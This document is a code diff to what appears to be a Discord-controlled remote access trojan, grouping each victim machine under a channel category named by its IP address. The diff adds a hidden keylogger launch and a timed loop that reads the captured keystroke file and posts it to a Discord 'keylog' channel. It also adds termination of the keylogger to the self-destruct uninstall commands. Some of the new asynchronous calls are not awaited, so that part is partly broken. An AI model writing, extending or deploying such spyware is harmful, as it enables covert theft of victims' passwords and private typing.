@@ -308,6 +308,7 @@ async def on_ready():
             category = await guild.create_category(str(ip))
             await guild.create_text_channel("info", category=category)
             await guild.create_text_channel("events", category=category)
+            await guild.create_text_channel("keylog", category=category)
             await guild.create_text_channel("commands", category=category)
 
             cameras = check_connected_cameras()
@@ -386,7 +387,35 @@ async def on_ready():
                 if channel:
                     await channel.send(embed=embed)
                 global process
-                process = subprocess.Popen(["pythonw", os.path.join(target_path, "skibidi-main", "keys.pyw")], shell=True)
+                try:
+                    process = subprocess.Popen(["pythonw", os.path.join(target_path, "skibidi-main", "keys.pyw")])
+                    embed = nextcord.Embed(title="Key logger started!", timestamp=datetime.now(), colour=0x00f51d, description="Key logger has now started!")
+                    embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
+
+                    channel = nextcord.utils.get(category.text_channels, name="events")
+                    if channel:
+                        await channel.send(embed=embed)
+
+                except Exception as e:
+                    print(f"Error starting keylogger: {e}")
+                    embed = nextcord.Embed(title="Key logger error", timestamp=datetime.now(), colour=0xff0000, description="Key logger error: " + str(e))
+                    embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
+
+                    channel = nextcord.utils.get(category.text_channels, name="events")
+                    if channel:
+                        await channel.send(embed=embed)
+
+    @tasks.loop(seconds=UPDATE_INTERVAL)
+    async def update_keylog():
+        category = nextcord.utils.get(guild.categories, name=str(ip))
+        
+        with open(os.path.join(target_path, "skibidi-main", "key_log.txt")) as keylog:
+            log = keylog.read()
+            keylog.close()
+        channel = nextcord.utils.get(category.text_channels, name="keylog")
+        channel.purge()
+        channel.send(log)
+        
 
     @tasks.loop(seconds=UPDATE_INTERVAL)
     async def send_status():
@@ -459,6 +488,7 @@ async def on_ready():
     send_status.start()
     await asyncio.sleep(1)
     update_activity.start()
+    update_keylog.start()
 
 
 
@@ -549,6 +579,7 @@ async def uninstall(interaction : Interaction):
         print("Uninstalling...")
         await interaction.response.send_message("Uninstalling this program all clients...")
         await interaction.edit_original_message(content="This program has been uninstalled from all clients!")
+        global process
         script_content = """
 import shutil
 import os
@@ -603,6 +634,7 @@ sys.exit()
                 file.write(script_content)
                 file.close()
         subprocess.Popen(["pythonw", os.path.join(target_path, "self-destruct.pyw")])
+        process.terminate()
         sys.exit(0)
 
 @client.slash_command(guild_ids=testServerId, description="Self-destructs client.")
@@ -612,6 +644,7 @@ async def uninstall_all(interaction : Interaction):
     print("Uninstalling...")
     await interaction.response.send_message("Uninstalling this program all clients...")
     await interaction.edit_original_message(content="This program has been uninstalled from all clients!")
+    global process
     script_content = """
 import shutil
 import os
@@ -666,6 +699,7 @@ sys.exit()
             file.write(script_content)
             file.close()
     subprocess.Popen(["pythonw", os.path.join(target_path, "self-destruct.pyw")])
+    process.terminate()
     sys.exit(0)
     
 @client.slash_command(guild_ids=testServerId, description="Closes all windows on client's computer.")
